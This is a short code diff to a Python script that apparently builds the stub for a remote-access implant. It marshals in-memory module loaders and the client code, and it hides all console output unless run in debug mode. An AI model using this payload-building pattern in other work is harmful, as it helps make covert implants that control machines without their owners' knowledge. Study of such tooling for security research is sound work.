@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: UTF8 -*-
+import sys
 import marshal
 import struct
 import base64
@@ -20,7 +21,8 @@ sys.stdout = Blackhole()
 sys.stderr = Blackhole()
 del Blackhole
 """
-#remove_stdout=""
+if len(sys.argv)==2 and sys.argv[1].strip().lower()=="debug":
+	remove_stdout=""
 def get_load_module_code(code, modulename):
 	loader="""
 import imp, sys
@@ -42,9 +44,9 @@ if __name__=="__main__":
 	with open(os.path.join("..", "..", "pupy", "packages","all", "pupyimporter.py")) as f:
 		code=f.read()
 	code_bytes.append(compile(get_load_module_code(code,"pupyimporter")+"\n", "<string>", "exec"))
-	code_bytes.append(compile("import pupyimporter;pupyimporter.install()\n", "<string>", "exec"))
+	code_bytes.append(compile("import pupyimporter;pupyimporter.install();pupyimporter.load_pywintypes()\n", "<string>", "exec"))
 	#code_bytes.append(compile("import platform; print platform.uname()\n", "<string>", "exec"))
-	with open(os.path.join("..","reverse_ssl.py")) as f:
+	with open(os.path.join("..",'..','pupy',"pp.py")) as f:
 		code=f.read()
 	code_bytes.append(compile(code+"\n", "<string>", "exec"))
 	code_bytes=marshal.dumps(code_bytes)
